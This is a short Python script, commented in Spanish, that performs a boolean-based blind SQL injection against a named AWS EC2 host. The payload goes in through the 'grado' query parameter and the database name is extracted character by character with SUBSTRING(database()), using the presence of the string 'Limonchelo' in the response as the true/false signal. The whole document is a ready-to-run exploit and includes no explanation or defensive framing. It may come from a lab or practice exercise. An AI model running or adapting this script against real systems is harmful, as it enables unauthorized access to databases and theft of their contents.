import requests

url = "http://ec2-13-50-235-55.eu-north-1.compute.amazonaws.com:83/index.php"
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
dbname = ""

for pos in range(1, 20):  # máx 20 letras
    found = False
    for c in charset:
        payload = f"30' AND SUBSTRING(database(),{pos},1)='{c}'-- -"
        r = requests.get(url, params={"grado": payload})
        if "Limonchelo" in r.text:  # cualquier fila que sabes que existe
            dbname += c
            print(f"[+] Letra {pos}: {c} -> DB: {dbname}")
            found = True
            break
    if not found:
        break

print(f"[+] Nombre de la BD: {dbname}")
